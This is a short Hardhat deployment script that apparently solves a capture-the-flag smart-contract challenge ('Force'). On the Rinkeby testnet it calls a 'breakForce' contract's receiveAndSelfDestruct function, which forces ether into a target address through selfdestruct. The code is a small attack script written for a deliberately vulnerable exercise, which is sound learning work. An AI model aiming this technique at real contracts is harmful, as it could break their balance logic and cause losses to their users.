const { ethers } = require("hardhat");
const breakForce = require("../artifacts/contracts/breakForce.sol/breakForce.json");
require("dotenv").config();

const main = async () => {
  const prov = new ethers.providers.InfuraProvider("rinkeby", process.env.INFURA_API_KEY);
  const [signer] = await ethers.getSigners();
  const hackAddress = "0x2d95853eC8541309fbF870fdB06BA473b0F509E5";
  const contract = new ethers.Contract(hackAddress, breakForce.abi, prov);
  const signedContract = contract.connect(signer);
  const tx = await signedContract.receiveAndSelfDestruct("0x0c6a8c32e214Ea37A5515Ec9CD8E70988a556098");
};

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
